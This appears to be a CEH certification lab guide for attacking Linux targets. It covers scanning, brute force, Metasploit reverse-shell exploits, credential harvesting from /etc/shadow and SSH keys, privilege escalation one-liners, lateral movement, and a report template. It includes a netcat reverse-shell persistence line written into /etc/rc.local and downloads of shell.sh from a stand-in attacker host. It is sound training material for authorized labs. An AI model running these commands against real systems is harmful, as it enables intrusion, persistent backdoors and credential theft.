# CEH v12 Linux Penetration Testing Lab Guide

## ⚠️ Important Legal Disclaimer

**This guide is for educational purposes only in authorized lab environments.**
- Only test systems you own or have explicit written permission to test
- Use isolated, offline lab environments
- Follow responsible disclosure practices

## 🏠 Linux Lab Environment Setup

### Required Components

**Virtualization Software:**
- VMware Workstation/Player
- VirtualBox
- KVM (Linux native)

**Network Configuration:**
- Host-only or NAT network
- Isolated from production networks
- IP range: 192.168.200.0/24 (recommended)

### Lab Machines

| Machine | OS | Purpose | IP Address |
|---------|----|---------|------------|
| Kali Linux | Kali Linux 2024.1 | Attacker | 192.168.200.10 |
| Linux Target | Ubuntu 18.04/CentOS 7 | Victim | 192.168.200.20 |
| Metasploitable | Metasploitable 2/3 | Vulnerable Practice | 192.168.200.30 |

## 📋 Methodology Overview

### 1. Reconnaissance
### 2. Scanning & Enumeration  
### 3. Vulnerability Assessment
### 4. Exploitation
### 5. Post-Exploitation
### 6. Privilege Escalation

## 🔍 Phase 1: Reconnaissance

### Network Discovery

```bash
# Ping sweep
nmap -sn 192.168.200.0/24

# ARP discovery
arp-scan -l
netdiscover -i eth0 -r 192.168.200.0/24

# Passive reconnaissance (if available)
tcpdump -i eth0 -w capture.pcap
```

### Target Identification

```bash
# Basic port scan
nmap -sS 192.168.200.20

# Service detection
nmap -sV -sC 192.168.200.20

# OS detection
nmap -O 192.168.200.20
```

## 🔎 Phase 2: Scanning & Enumeration

### Comprehensive Port Scanning

```bash
# Full TCP port scan
nmap -p- --min-rate 1000 192.168.200.20

# UDP port scan (slower)
nmap -sU --top-ports 100 192.168.200.20

# Service enumeration
nmap -sV -sC -A -O 192.168.200.20

# Vulnerability scanning
nmap --script vuln 192.168.200.20
```

### SSH Enumeration

```bash
# SSH version detection
nc -nv 192.168.200.20 22

# SSH security checks
nmap --script ssh2-enum-algos 192.168.200.20
nmap --script ssh-auth-methods --script-args="ssh.user=root" 192.168.200.20

# SSH brute force (ethical practice only)
hydra -L users.txt -P passwords.txt ssh://192.168.200.20
```

### Web Service Enumeration

```bash
# HTTP/HTTPS service scan
nmap -p 80,443,8080,8443 --script http-enum 192.168.200.20

# Directory brute-forcing
gobuster dir -u http://192.168.200.20 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://192.168.200.20 -w /usr/share/wordlists/dirb/common.txt

# Virtual host enumeration
gobuster vhost -u http://192.168.200.20 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

### FTP Enumeration

```bash
# FTP anonymous login check
ftp 192.168.200.20
# Username: anonymous
# Password: (any)

# FTP version detection
nmap --script ftp-anon,ftp-bounce,ftp-syst 192.168.200.20

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.200.20
```

### Samba Enumeration

```bash
# SMB share enumeration
smbclient -L //192.168.200.20 -N
smbmap -H 192.168.200.20

# SMB vulnerability checks
nmap --script smb-vuln* -p 445 192.168.200.20

# Enum4linux
enum4linux -a 192.168.200.20
```

## ⚔️ Phase 3: Vulnerability Assessment

### Automated Vulnerability Scanning

```bash
# Nmap vulnerability scripts
nmap --script vuln 192.168.200.20

# Nikto web scanner
nikto -h http://192.168.200.20

# OpenVAS/GVM setup (comprehensive)
gvm-setup
gvm-cli socket --xml "<get_tasks/>"

# Nessus (commercial alternative)
# Setup and run credentialed scans
```

### Manual Vulnerability Assessment

#### Service-specific Checks

```bash
# Check for outdated services
nmap -sV --version-intensity 5 192.168.200.20

# Check for default credentials
# Common services: SSH, FTP, MySQL, PostgreSQL, Tomcat

# Web application testing
dirb http://192.168.200.20
wapiti -u http://192.168.200.20
```

## 💥 Phase 4: Exploitation

### Common Linux Service Exploits

#### SSH Attacks

```bash
# Password spraying
hydra -L users.txt -P passwords.txt ssh://192.168.200.20 -t 4

# SSH key brute force (if keys are exposed)
ssh-keygen -f keyfile -N ''
```

#### FTP Exploitation

```bash
# Anonymous FTP access
ftp anonymous@192.168.200.20

# FTP bounce attack (if vulnerable)
nmap -b anonymous:password@192.168.200.20 192.168.200.30
```

#### Web Application Attacks

```bash
# SQL Injection testing
sqlmap -u "http://192.168.200.20/login.php" --forms --batch

# File inclusion testing
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hw 0 http://192.168.200.20/index.php?page=FUZZ

# Command injection testing
curl "http://192.168.200.20/ping.php?ip=127.0.0.1;whoami"
```

### Metasploit Framework for Linux

#### Common Linux Exploits

```bash
# Start Metasploit
msfconsole

# Search for Linux exploits
search type:exploit platform:linux

# Example: Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOST 192.168.200.20
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.200.10
exploit

# Example: DistCC exploitation
use exploit/unix/misc/distcc_exec
set RHOST 192.168.200.20
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.200.10
exploit
```

#### Web Application Exploits

```bash
# PHP CGI argument injection
use exploit/multi/http/php_cgi_arg_injection
set RHOST 192.168.200.20
set TARGETURI /test.php
set LHOST 192.168.200.10
exploit

# Shellshock exploitation
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.200.20
set TARGETURI /cgi-bin/test.cgi
set LHOST 192.168.200.10
exploit
```

## 🏴‍☠️ Phase 5: Post-Exploitation

### Initial Access Stabilization

```bash
# Upgrade shell to TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background and upgrade in Metasploit
sessions -u <session_id>

# Create reverse shell persistence
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.200.10 4444 >/tmp/f" >> /etc/rc.local
```

### System Information Gathering

```bash
# Basic system info
uname -a
cat /etc/*release
lsb_release -a

# Network information
ifconfig
ip addr
netstat -tulpn
route -n

# User information
whoami
id
cat /etc/passwd
cat /etc/shadow
w
last
```

### Credential Harvesting

```bash
# Find password files
find / -name "*.pwd" -o -name "*.pass" -o -name "password*" 2>/dev/null

# Check history files
cat ~/.bash_history
cat ~/.ssh/*

# Look for configuration files with passwords
find / -name "*.conf" -exec grep -H "password" {} \; 2>/dev/null
```

## 🚀 Phase 6: Privilege Escalation

### Enumeration Scripts

```bash
# Automated enumeration
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# LinEnum
./LinEnum.sh
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Common kernel exploits:
# - DirtyCow (CVE-2016-5195)
# - overlayfs (CVE-2021-3493)
# - PwnKit (CVE-2021-4034)

# Search for exploits
searchsploit linux kernel <version>
```

### SUID/SGID Exploitation

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# Common vulnerable SUID binaries:
# - find
# - nano/vim
# - bash
# - cp/mv

# Example: find command privilege escalation
touch /tmp/test
find /tmp/test -exec whoami \;
```

### Sudo Privilege Escalation

```bash
# Check sudo permissions
sudo -l

# Common sudo escalation vectors:
sudo find /etc/passwd -exec /bin/sh \;
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo perl -e 'exec "/bin/sh";'
```

### Cron Job Exploitation

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Look for writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
```

### Capabilities Exploitation

```bash
# Check capabilities
getcap -r / 2>/dev/null

# Common capability escalations:
# cap_setuid+ep
getcap /usr/bin/python2.7
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## 📊 Phase 7: Lateral Movement

### SSH Key Reuse

```bash
# Look for SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# Use found keys
chmod 600 keyfile
ssh -i keyfile user@target
```

### Password Reuse

```bash
# Try found passwords on other services
hydra -l username -p foundpassword ssh://192.168.200.30
```

## 🛠️ Useful Linux-Specific Tools

### Enumeration Tools

```bash
# LinPEAS - Privilege Escalation Awesome Script
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
```

### Exploitation Tools

```bash
# Searchsploit for exploit database
searchsploit "Linux Kernel 3.2"

# ExploitDB local copy
searchsploit -m 40839  # Download specific exploit

# Custom exploit compilation
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

## 🧪 Practice Exercises

### Exercise 1: Basic Enumeration
**Objective:** Enumerate all services and versions on Linux target

### Exercise 2: Web Application Testing  
**Objective:** Find and exploit web vulnerabilities

### Exercise 3: Service Exploitation
**Objective:** Exploit vulnerable services (FTP, Samba, etc.)

### Exercise 4: Privilege Escalation
**Objective:** Escalate from low-privilege user to root

### Exercise 5: Lateral Movement
**Objective:** Move from compromised host to another system

## 📝 Linux-Specific Lab Report Template

```markdown
# Linux Penetration Test Report

## Executive Summary
- Test Date: [Date]
- Target: [IP Address/Hostname]
- OS: [Linux Distribution/Version]
- Tester: [Your Name]

## Methodology
1. Reconnaissance & Enumeration
2. Vulnerability Assessment
3. Initial Compromise
4. Privilege Escalation
5. Lateral Movement
6. Reporting

## Critical Findings
### Remote Code Execution
- [Service/Application] - [CVE/Vulnerability]

### Privilege Escalation
- [Vulnerability/Misconfiguration] - [Impact]

### Security Misconfigurations
- [Configuration Issue] - [Risk Level]

## Technical Details
### Enumeration Results
```
[Port scan results]
[Service versions]
[Vulnerabilities identified]
```

### Exploitation Steps
```
[Step-by-step exploitation process]
[Proof of concept commands]
```

### Post-Exploitation Findings
```
[User information gathered]
[Network access gained]
[Data accessed]
```

## Recommendations
### Immediate Actions
- [Patch specific vulnerabilities]
- [Remove vulnerable services]
- [Change default credentials]

### Long-term Improvements
- [Implement security monitoring]
- [Regular vulnerability assessments]
- [Security hardening guidelines]
```

## 🔧 Useful Command Reference

### Quick Service Checks
```bash
# Check for listening ports
netstat -tulpn
ss -tulpn

# Check running processes
ps aux
top

# Check installed packages
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS

# Check scheduled tasks
crontab -l
systemctl list-timers
```

### File Transfer Methods
```bash
# Python HTTP server
python3 -m http.server 8000

# SCP transfer
scp file.txt user@target:/tmp/

# Wget/cURL
wget http://attacker.com/shell.sh
curl -O http://attacker.com/shell.sh

# Netcat file transfer
# On attacker: nc -lvp 4444 < file.txt
# On target: nc attacker_ip 4444 > file.txt
```
